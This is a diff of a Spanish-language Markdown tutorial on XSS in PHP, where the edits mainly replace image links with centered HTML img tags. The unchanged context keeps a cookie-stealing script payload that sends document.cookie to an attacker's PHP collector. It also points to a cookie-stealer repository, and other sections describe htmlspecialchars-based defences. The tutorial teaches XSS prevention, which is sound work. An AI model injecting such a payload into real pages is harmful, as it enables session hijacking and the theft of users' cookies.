@@ -116,11 +116,11 @@ Copia en el archivo coockieStealer/index.php [este archivo php](files/steal.php)
 <script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 ~~~
 
-![](images/xss4.png)
+<div align="center">
+  <img src="/Imagenes/5.png" width="500">
+</div>
 
 En el archivo **cookie.txt** del servidor del atacante se habrán guardado los datos de nuestra cookie:
-
-![](images/xss8.png)
 
 Puedes investigar más en <https://github.com/TheWation/PhpCookieStealer/tree/master>
 
@@ -156,7 +156,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </form>
 ~~~
 
-![](files/xss5.png)
+<div align="center">
+  <img src="/Imagenes/6.png" width="500">
+</div>
 
 La función que hemos creado al principio del documento: filter_string_polyfill nos va a eliminar todos los caracteres peligrosos y nos cambia caracteres conflictivos.
 
@@ -186,7 +188,9 @@ if (isset($_POST['comment'])) {
 </form>
 ~~~
 
-![](images/xss5.png)
+<div align="center">
+  <img src="/Imagenes/7.png" width="500">
+</div>
 
 Aunque usar htmlspecialchars() es una buena medida para prevenir ataques XSS, todavía se puede mejorar la
 seguridad y funcionalidad del código con los siguientes puntos:
@@ -217,7 +221,13 @@ if (!empty($comment) && strlen($comment) <= 500) {
 
 Evita comentarios vacíos o excesivamente largos (500 caracteres).
 
-![](files/xss6.png)
+<div align="center">
+  <img src="/Imagenes/8.png" width="500">
+</div>
+
+<div align="center">
+  <img src="/Imagenes/9.png" width="500">
+</div>
 
 **Protección contra inyecciones HTML y JS (XSS)**
 ---
